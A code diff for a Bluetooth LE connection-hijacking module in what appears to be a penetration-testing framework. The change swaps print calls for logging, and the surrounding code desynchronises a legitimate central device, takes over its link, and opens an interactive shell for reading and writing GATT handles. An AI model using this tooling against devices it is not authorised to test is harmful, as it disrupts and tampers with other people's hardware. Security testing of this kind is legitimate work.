@@ -27,7 +27,7 @@ from datetime import datetime, timezone
 from core.dongle import WhadDongle
 from core.models import Connection, Target, Finding
 from core.db import insert_finding
-from core.logger import get_logger
+from core.logger import get_logger, prompt_line
 import config
 
 log = get_logger("s20_hijack")
@@ -88,11 +88,11 @@ def run(
         f"chMap=0x{ch_map:010X}"
     )
 
-    print(f"\n  [S20] Synchronising to connection "
+    log.info(f"\n  [S20] Synchronising to connection "
           f"{central_addr} → {periph_addr} ...")
-    print(f"       AA=0x{aa:08X}  CRC=0x{crc:06X}  "
+    log.info(f"       AA=0x{aa:08X}  CRC=0x{crc:06X}  "
           f"chMap={conn.channel_map}  hop={hop_inc}")
-    print(f"       Sync window: {_SYNC_TIMEOUT}s\n")
+    log.info(f"       Sync window: {_SYNC_TIMEOUT}s\n")
 
     hijacker = _create_hijacker(dongle, Hijacker)
     if hijacker is None:
@@ -116,7 +116,7 @@ def run(
             return False
 
         log.info(f"[S20] Synchronised! Attempting hijack of {periph_addr} ...")
-        print(f"  [S20] Synchronised to live connection. Injecting hijack ...")
+        log.info(f"  [S20] Synchronised to live connection. Injecting hijack ...")
 
         # --- Perform the actual hijack ---
         hijacked = _do_hijack(hijacker, _HIJACK_TIMEOUT)
@@ -137,9 +137,9 @@ def run(
         return False
 
     log.info(f"[S20] *** HIJACK SUCCEEDED: {periph_addr} ***")
-    print(f"\n  [S20] HIJACK SUCCESSFUL — {periph_addr}")
-    print(f"       We are now the Central. Legitimate device {central_addr}")
-    print(f"       has been de-synchronized and lost its connection.\n")
+    log.info(f"\n  [S20] HIJACK SUCCESSFUL — {periph_addr}")
+    log.info(f"       We are now the Central. Legitimate device {central_addr}")
+    log.info(f"       has been de-synchronized and lost its connection.\n")
 
     _record_hijack_finding(conn, engagement_id, profile)
 
@@ -283,7 +283,7 @@ def _post_hijack_gatt_shell(
         profile = _quick_gatt_enum(periph_dev, periph_addr)
 
     if profile is None:
-        print("  [S20] GATT enumeration failed. Entering raw shell anyway.")
+        log.info("  [S20] GATT enumeration failed. Entering raw shell anyway.")
         profile = []
 
     # Manufacture a minimal Target if we don't have one
@@ -298,7 +298,7 @@ def _post_hijack_gatt_shell(
             connectable=True,
         )
 
-    print(
+    log.info(
         "\n  [S20] Entering GATT shell on HIJACKED connection.\n"
         "       The legitimate central has been evicted. You own this link.\n"
     )
@@ -325,13 +325,13 @@ def _gatt_shell_on_hijacked(periph_dev, target, profile: list[dict], engagement_
     }
     addr = target.bd_address
 
-    print("\n" + "═" * 76)
-    print("  HIJACKED GATT SHELL")
-    print(f"  Target : {addr}  (connection owned by us)")
-    print("  Commands: read  write  wnr  info  pyshell  quit")
-    print("═" * 76)
+    log.info("\n" + "═" * 76)
+    log.info("  HIJACKED GATT SHELL")
+    log.info(f"  Target : {addr}  (connection owned by us)")
+    log.info("  Commands: read  write  wnr  info  pyshell  quit")
+    log.info("═" * 76)
     _print_handle_table(profile, by_handle)
-    print()
+
 
     try:
         import readline as _rl
@@ -341,9 +341,9 @@ def _gatt_shell_on_hijacked(periph_dev, target, profile: list[dict], engagement_
 
     while True:
         try:
-            raw = input("  hijack> ").strip()
+            raw = prompt_line("  hijack> ").strip()
         except (EOFError, KeyboardInterrupt):
-            print()
+
             break
         if not raw:
             continue
@@ -358,49 +358,49 @@ def _gatt_shell_on_hijacked(periph_dev, target, profile: list[dict], engagement_
 
         elif cmd == "read":
             if len(parts) < 2:
-                print("  Usage: read <handle>")
+                log.info("  Usage: read <handle>")
                 continue
             try:
                 h = int(parts[1], 0)
                 val = periph_dev.read(h)
                 if val is None:
-                    print(f"  h={h}: (empty)")
+                    log.info(f"  h={h}: (empty)")
                 else:
                     hex_s = val.hex() if isinstance(val, bytes) else str(val)
                     text_s = val.decode("utf-8", errors="replace").strip("\x00") if isinstance(val, bytes) else str(val)
                     name = by_handle.get(h, {}).get("uuid_name") or ""
-                    print(f"  h={h} {name}:")
-                    print(f"    hex  : {hex_s}")
-                    print(f"    text : {text_s or '(binary)'}")
+                    log.info(f"  h={h} {name}:")
+                    log.info(f"    hex  : {hex_s}")
+                    log.info(f"    text : {text_s or '(binary)'}")
             except Exception as exc:
-                print(f"  read h={parts[1]} → {type(exc).__name__}: {exc}")
+                log.info(f"  read h={parts[1]} → {type(exc).__name__}: {exc}")
 
         elif cmd == "write":
             if len(parts) < 3:
-                print("  Usage: write <handle> <hex>")
+                log.info("  Usage: write <handle> <hex>")
                 continue
             try:
                 h = int(parts[1], 0)
                 data = bytes.fromhex(parts[2])
                 periph_dev.write(h, data)
-                print(f"  write h={h}: OK")
+                log.info(f"  write h={h}: OK")
             except Exception as exc:
-                print(f"  write → {type(exc).__name__}: {exc}")
+                log.info(f"  write → {type(exc).__name__}: {exc}")
 
         elif cmd == "wnr":
             if len(parts) < 3:
-                print("  Usage: wnr <handle> <hex>")
+                log.info("  Usage: wnr <handle> <hex>")
                 continue
             try:
                 h = int(parts[1], 0)
                 data = bytes.fromhex(parts[2])
                 periph_dev.write_command(h, data)
-                print(f"  wnr h={h}: OK")
+                log.info(f"  wnr h={h}: OK")
             except Exception as exc:
-                print(f"  wnr → {type(exc).__name__}: {exc}")
+                log.info(f"  wnr → {type(exc).__name__}: {exc}")
 
         elif cmd == "pyshell":
-            print(
+            log.info(
                 "\n  Python REPL — locals: periph, profile, by_handle.\n"
                 "  Ctrl-D to return to hijack shell.\n"
             )
@@ -414,9 +414,9 @@ def _gatt_shell_on_hijacked(periph_dev, target, profile: list[dict], engagement_
                 pass
 
         else:
-            print(f"  Unknown: {cmd!r}  (read / write / wnr / info / pyshell / quit)")
+            log.info(f"  Unknown: {cmd!r}  (read / write / wnr / info / pyshell / quit)")
 
-    print(f"\n  [S20] Hijack shell closed — {addr}\n")
+    log.info(f"\n  [S20] Hijack shell closed — {addr}\n")
 
 
 def _get_periph_from_hijacker(hijacker):
@@ -508,8 +508,8 @@ def _decode_props(raw) -> list[str]:
 
 
 def _print_handle_table(profile: list[dict], by_handle: dict) -> None:
-    print(f"\n  {'H':>4}  {'UUID':<36}  {'NAME':<22}  PROPS")
-    print("  " + "─" * 70)
+    log.info(f"\n  {'H':>4}  {'UUID':<36}  {'NAME':<22}  PROPS")
+    log.info("  " + "─" * 70)
     for c in sorted(profile, key=lambda x: x.get("value_handle", 0)):
         h = c.get("value_handle", 0)
         uuid_s = (c.get("uuid") or "")[:36]
@@ -518,7 +518,7 @@ def _print_handle_table(profile: list[dict], by_handle: dict) -> None:
         val = c.get("value_text") or ""
         if val and len(val) > 16: val = val[:15] + "…"
         val_col = f"  [{val}]" if val else ""
-        print(f"  {h:>4}  {uuid_s:<36}  {name:<22}  {props}{val_col}")
+        log.info(f"  {h:>4}  {uuid_s:<36}  {name:<22}  {props}{val_col}")
 
 
 # ── Findings ───────────────────────────────────────────────────────────────────
